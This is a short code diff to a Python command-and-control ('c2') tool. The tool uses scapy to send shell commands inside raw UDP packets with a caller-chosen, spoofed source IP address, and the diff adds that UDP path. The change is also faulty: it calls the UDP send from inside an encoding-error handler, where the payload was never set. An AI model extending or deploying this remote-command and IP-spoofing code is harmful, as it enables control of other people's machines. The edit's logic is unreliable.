@@ -1,7 +1,7 @@
 from c2.view import C2View
 from pathlib import Path
 from importlib.resources import files
-from scapy.all import IP, TCP, send
+from scapy.all import IP, TCP, UDP, send
 import struct
 import argparse
 import logging
@@ -98,13 +98,13 @@ class C2:
             payload = self._generate_payload(args, False)
         except UnicodeEncodeError:
             self.view.print_error("Could not encode shell command.")
-            return False
+        self._send_udp(payload, args)
 
     def _send_udp(self, payload: bytes, args: argparse.Namespace) -> bool:
         packet = (
             IP(dst=args.dip, src=args.sip)
             / UDP(dport=args.dport, sport=args.sport)
-            / Raw(load=payload)
+            / payload
         )
 
         packet_len = len(packet)
